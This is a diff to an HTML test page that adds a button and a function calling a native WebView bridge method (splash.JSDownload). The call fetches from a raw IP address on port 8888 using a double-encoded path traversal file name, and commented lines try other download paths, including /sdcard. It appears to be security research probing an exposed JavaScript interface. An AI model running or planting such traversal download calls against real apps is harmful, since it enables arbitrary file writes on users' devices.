@@ -145,6 +145,17 @@
                 document.getElementById("myP").innerHTML = error;
             }
         }
+
+        function tryDownload4(){
+            try {
+                document.getElementById("myP").innerHTML = splash.JSDownload("random","http://139.180.144.198:8888/..%252ftestHERENOW.txt")
+                // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
+                // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
+                // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
+            } catch (error) {
+                document.getElementById("myP").innerHTML = error;
+            }
+        }
     </script>
 
     <button onclick="findAllVariables()">
@@ -206,6 +217,12 @@
     </button>
     <br>
     <button onclick="tryDownload3()">
+        Call download3 - Native Function
+
+    </button>
+
+    <br>
+    <button onclick="tryDownload4()">
         Call download3 - Native Function
 
     </button>
